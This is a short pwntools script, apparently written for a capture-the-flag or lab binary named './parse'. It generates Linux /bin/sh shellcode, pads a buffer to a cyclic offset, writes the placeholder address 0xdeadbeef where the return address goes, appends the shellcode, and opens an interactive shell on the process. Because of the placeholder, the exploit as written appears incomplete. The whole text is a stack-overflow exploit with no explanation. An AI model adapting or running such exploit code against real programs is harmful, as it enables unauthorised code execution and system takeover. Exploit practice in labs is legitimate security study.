from pwn import *

context.update(arch='amd64', os='linux')

shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))

payload  = cyclic(cyclic_find(0x0000555555555751))
payload += p64(0xdeadbeef)
payload += asm(shellcode)

p = process("./parse")
p.sendline(payload)
p.interactive()

